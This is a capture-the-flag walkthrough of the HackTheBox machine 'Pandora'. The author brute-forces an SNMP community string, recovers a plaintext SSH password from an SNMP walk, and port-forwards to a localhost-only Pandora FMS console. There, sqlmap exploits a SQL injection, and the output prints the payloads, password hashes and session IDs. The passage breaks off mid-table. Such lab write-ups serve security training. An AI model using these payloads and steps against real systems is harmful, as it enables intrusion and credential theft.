### Pandora HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.136

Nmap Tcp Scan:

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ nmap -sCV -A 10.10.11.136 -p22,80  
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-08 12:27 WAT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds
```

Only 2 tcp ports open. I'll check out the web server

Heading over to the web browser shows the domain name 
![image](https://user-images.githubusercontent.com/113513376/217517662-6b97d5db-8f58-455e-89ce-b141b174d768.png)

I added that to my `/etc/hosts` file already

While I fuzzed for directories i couldn't find any important directory also with vhosts

```
└─$ gobuster dir -u http://panda.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,bak,db,html
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://panda.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/08 12:20:23 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/assets               (Status: 301) [Size: 307] [--> http://panda.htb/assets/]
/index.html           (Status: 200) [Size: 33560]
/server-status        (Status: 403) [Size: 274]
Progress: 4613 / 4615 (99.96%)
===============================================================
2023/02/08 12:22:33 Finished
===============================================================
```

Scanning for udp ports show there's snmp open

```
└─$ sudo nmap -sCV -A 10.10.11.136 -p161  
[sudo] password for mark: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-08 12:29 WAT
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.28s latency).

PORT    STATE  SERVICE VERSION
161/tcp open snmp
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 161/tcp)
HOP RTT       ADDRESS
1   262.58 ms 10.10.16.1
2   137.36 ms panda.htb (10.10.11.136)

OS and Service detection performed. Please report any incorrect
```

Using hydra i got the community key

```
└─$ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt snmp://panda.htb
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-08 12:31:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://panda.htb:161/
[161][snmp] host: panda.htb   password: public
[STATUS] attack finished for panda.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-08 12:31:57
```

Now i used snmpbulkwalk to enumerate the snmp service running cause its way faster than snmpwalk since it allows thread

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ snmpbulkwalk -Cr1000 -v 2c -c public panda.htb > snmpscan 
```

After spending a while looking at the data i got a process which runs a binary as user daniel 

```
└─$ cat snmpscan| grep /bin
iso.3.6.1.2.1.25.4.2.1.4.713 = STRING: "/usr/bin/VGAuthService"
iso.3.6.1.2.1.25.4.2.1.4.719 = STRING: "/usr/bin/vmtoolsd"
iso.3.6.1.2.1.25.4.2.1.4.758 = STRING: "/usr/bin/dbus-daemon"
iso.3.6.1.2.1.25.4.2.1.4.783 = STRING: "/usr/bin/python3"
iso.3.6.1.2.1.25.4.2.1.4.910 = STRING: "/bin/sh"
iso.3.6.1.2.1.25.4.2.1.4.1097 = STRING: "/usr/bin/host_check"
iso.3.6.1.2.1.25.4.2.1.5.783 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.910 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
```
                                                                 
Trying the username and password over ssh works `daniel:HotelBabylon23`

```
└─$ ssh daniel@panda.htb                                     
The authenticity of host 'panda.htb (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'panda.htb' (ED25519) to the list of known hosts.
daniel@panda.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed  8 Feb 11:38:16 UTC 2023

  System load:           0.0
  Usage of /:            63.1% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7d86

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$
```

There are two users so likely we are pivoting from user daniel to matt

```
daniel@pandora:~$ ls /home
daniel  matt
daniel@pandora:~$ 
```

Checking the webroot directory shows there's another instance running a web service

```
daniel@pandora:/var/www$ ls
html  pandora
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
daniel@pandora:/var/www/pandora$ cd pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ ls
ajax.php    composer.json  DEBIAN                extras   images        mobile                            pandora_console_logrotate_suse    pandoradb.sql                     vendor
attachment  composer.lock  docker_entrypoint.sh  fonts    include       operation                         pandora_console_logrotate_ubuntu  pandora_websocket_engine.service  ws.php
audit.log   COPYING        Dockerfile            general  index.php     pandora_console.log               pandora_console_upgrade           tests
AUTHORS     DB_Dockerfile  extensions            godmode  install.done  pandora_console_logrotate_centos  pandoradb_data.sql                tools
daniel@pandora:/var/www/pandora/pandora_console$ cd include/
daniel@pandora:/var/www/pandora/pandora_console/include$ cat config.php 
cat: config.php: Permission denied
daniel@pandora:/var/www/pandora/pandora_console/include$ ls -l config.
config.inc.php  config.php      
daniel@pandora:/var/www/pandora/pandora_console/include$ ls -l config.php 
-rw------- 1 matt matt 413 Dec  3  2021 config.php
```

We don't have access to view it too bad only user matt does

So i searched the apache2 config and got the real vhost name

```
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
daniel@pandora:/etc/apache2/sites-enabled$
```

So i'll add `pandora.panda.htb` to my `/etc/hosts` file and access the pandora cms instance

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ cat /etc/hosts | grep pan
10.10.11.136    panda.htb pandora.panda.htb
```

I tried opening it up on the web browser but i still got the normal page lol
![image](https://user-images.githubusercontent.com/113513376/217521833-515fec87-26fc-406b-b9bb-e025917aadd8.png)

So basically it only works if the connection is from localhost since thats what the conf sets

```
<VirtualHost localhost:80>
```

Now i'll do ssh local port forward and access it

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ ssh -L 80:127.0.0.1:80 daniel@panda.htb
daniel@panda.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed  8 Feb 11:51:24 UTC 2023

  System load:           0.0
  Usage of /:            63.1% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7d86

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Feb  8 11:38:17 2023 from 10.10.16.7
daniel@pandora:~$ 
```

Now i'll just check if it works

```
┌──(mark__haxor)-[~]
└─$ nmap -sCV 127.0.0.1 -p80                          
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-08 12:51 WAT
Nmap scan report for haxor (127.0.0.1)
Host is up (0.00086s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds
```

With that i can access it now
![image](https://user-images.githubusercontent.com/113513376/217522577-4d0e4e9b-921e-4a42-905b-784e51e2272d.png)

We see the version below after searching for exploit i got this [Exploit](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/)

Its an sqli vulnerability and an authenticated rce exploit. Testing the sqli works 
![image](https://user-images.githubusercontent.com/113513376/217526903-7518e48c-f4b9-4987-b461-1a5ad02fd0bf.png)

I'll use sqlmap to automate the exploitation for me

Firstly i'll get the number of db in it

```
└─$ sqlmap --url http://localhost/pandora_console//include/chart_generator.php?session_id=1 --batch --level 5 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:21:55 /2023-02-08/

[13:21:56] [INFO] resuming back-end DBMS 'mysql' 
[13:21:56] [INFO] testing connection to the target URL
[13:21:56] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=3aqsjo38dl7...hfkmefeic2'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: session_id=1' AND 1087=(SELECT (CASE WHEN (1087=1087) THEN 1087 ELSE (SELECT 1073 UNION SELECT 1334) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 6427 FROM(SELECT COUNT(*),CONCAT(0x7171706a71,(SELECT (ELT(6427=6427,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- inQU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 4907 FROM (SELECT(SLEEP(5)))amAg)-- FJwe
---
[13:21:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:21:56] [INFO] fetching database names
[13:21:57] [WARNING] reflective value(s) found and filtering out
[13:21:57] [INFO] retrieved: 'information_schema'
[13:21:57] [INFO] retrieved: 'pandora'
available databases [2]:
[*] information_schema
[*] pandora

[13:21:57] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/localhost'

[*] ending @ 13:21:57 /2023-02-08/
```

Now i'll enumerate the tables in `pandora` db its quite much

```
└─$ sqlmap --url http://localhost/pandora_console//include/chart_generator.php?session_id=1 --batch --level 5 -D pandora --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:24:41 /2023-02-08/

[13:24:41] [INFO] resuming back-end DBMS 'mysql' 
[13:24:46] [INFO] testing connection to the target URL
[13:24:47] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=lsiko1iubj3...gspr4j74t0'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: session_id=1' AND 1087=(SELECT (CASE WHEN (1087=1087) THEN 1087 ELSE (SELECT 1073 UNION SELECT 1334) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 6427 FROM(SELECT COUNT(*),CONCAT(0x7171706a71,(SELECT (ELT(6427=6427,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- inQU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 4907 FROM (SELECT(SLEEP(5)))amAg)-- FJwe
---
[13:24:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:24:47] [INFO] fetching tables for database: 'pandora'
Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+

[13:24:47] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/localhost'

[*] ending @ 13:24:47 /2023-02-08/
```

Looking through the tables present i saw `tpassword_history` lets dump it

```
└─$ sqlmap --url http://localhost/pandora_console//include/chart_generator.php?session_id=1 --batch --level 5 -D pandora -T tpassword_history --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:27:38 /2023-02-08/

[13:27:39] [INFO] resuming back-end DBMS 'mysql' 
[13:27:39] [INFO] testing connection to the target URL
[13:27:45] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=sq2lbdsfp1j...0imt66pmmi'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: session_id=1' AND 1087=(SELECT (CASE WHEN (1087=1087) THEN 1087 ELSE (SELECT 1073 UNION SELECT 1334) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 6427 FROM(SELECT COUNT(*),CONCAT(0x7171706a71,(SELECT (ELT(6427=6427,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- inQU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 4907 FROM (SELECT(SLEEP(5)))amAg)-- FJwe
---
[13:27:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:27:45] [INFO] fetching columns for table 'tpassword_history' in database 'pandora'
[13:27:45] [WARNING] reflective value(s) found and filtering out
[13:27:45] [INFO] retrieved: 'id_pass'
[13:27:46] [INFO] retrieved: 'int(10) unsigned'
[13:27:46] [INFO] retrieved: 'id_user'
[13:27:46] [INFO] retrieved: 'varchar(60)'
[13:27:47] [INFO] retrieved: 'password'
[13:27:47] [INFO] retrieved: 'varchar(45)'
[13:27:48] [INFO] retrieved: 'date_begin'
[13:27:48] [INFO] retrieved: 'datetime'
[13:27:48] [INFO] retrieved: 'date_end'
[13:27:49] [INFO] retrieved: 'datetime'
[13:27:49] [INFO] fetching entries for table 'tpassword_history' in database 'pandora'
[13:27:49] [INFO] retrieved: '2021-06-11 17:28:54'
[13:27:50] [INFO] retrieved: '0000-00-00 00:00:00'
[13:27:50] [INFO] retrieved: '1'
[13:27:50] [INFO] retrieved: 'matt'
[13:27:51] [INFO] retrieved: 'f655f807365b6dc602b31ab3d6d43acc'
[13:27:51] [INFO] retrieved: '2021-06-17 00:11:54'
[13:27:51] [INFO] retrieved: '0000-00-00 00:00:00'
[13:27:52] [INFO] retrieved: '2'
[13:27:52] [INFO] retrieved: 'daniel'
[13:27:52] [INFO] retrieved: '76323c174bd49ffbbdedf678f6cc89a6'
[13:27:52] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[13:27:52] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[13:27:52] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[13:27:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:27:52] [INFO] starting 2 processes 
[13:28:07] [INFO] current status: emine... \^C
[13:28:07] [WARNING] user aborted during dictionary-based attack phase (Ctrl+C was pressed)
[13:28:07] [WARNING] no clear password(s) found                                                                                                                                                                   
Database: pandora
Table: tpassword_history
[2 entries]
+---------+---------+---------------------+----------------------------------+---------------------+
| id_pass | id_user | date_end            | password                         | date_begin          |
+---------+---------+---------------------+----------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
+---------+---------+---------------------+----------------------------------+---------------------+

[13:28:07] [INFO] table 'pandora.tpassword_history' dumped to CSV file '/home/mark/.local/share/sqlmap/output/localhost/dump/pandora/tpassword_history.csv'
[13:28:07] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/localhost'

[*] ending @ 13:28:07 /2023-02-08/
```

I attempted to brute force the password hash but it didn't work :(

Looking through the table i got another table which i found interesting `tsessions_php`

Lets dump it

```
└─$ sqlmap --url http://localhost/pandora_console//include/chart_generator.php?session_id=1 --batch --level 5 -D pandora -T tsessions_php --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:29:22 /2023-02-08/

[13:29:22] [INFO] resuming back-end DBMS 'mysql' 
[13:29:22] [INFO] testing connection to the target URL
[13:29:23] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=91mdc7crbh7...78adm9qkia'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: session_id=1' AND 1087=(SELECT (CASE WHEN (1087=1087) THEN 1087 ELSE (SELECT 1073 UNION SELECT 1334) END))-- -

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 6427 FROM(SELECT COUNT(*),CONCAT(0x7171706a71,(SELECT (ELT(6427=6427,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- inQU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 4907 FROM (SELECT(SLEEP(5)))amAg)-- FJwe
---
[13:29:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
Database: pandora
Table: tsessions_php
[49 entries]
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 374vrl53ppsglk498thah0iqse | NULL                                                | 1675858816  |
| 3aqsjo38dl7967tehfkmefeic2 | NULL                                                | 1675858917  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 91mdc7crbh7m3mvi78adm9qkia | NULL                                                | 1675859385  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hmsuju302qdkop42ka3o9lsk2b | NULL                                                | 1675859059  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| i3j9bsvtmij7h2mheeqm49dtqm | id_usuario|s:6:"daniel";                            | 1675855065  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| lsiko1iubj3jt6lugspr4j74t0 | NULL                                                | 1675859086  |
| n99icpcvvhva0garngamb28gnb | NULL                                                | 1675858628  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
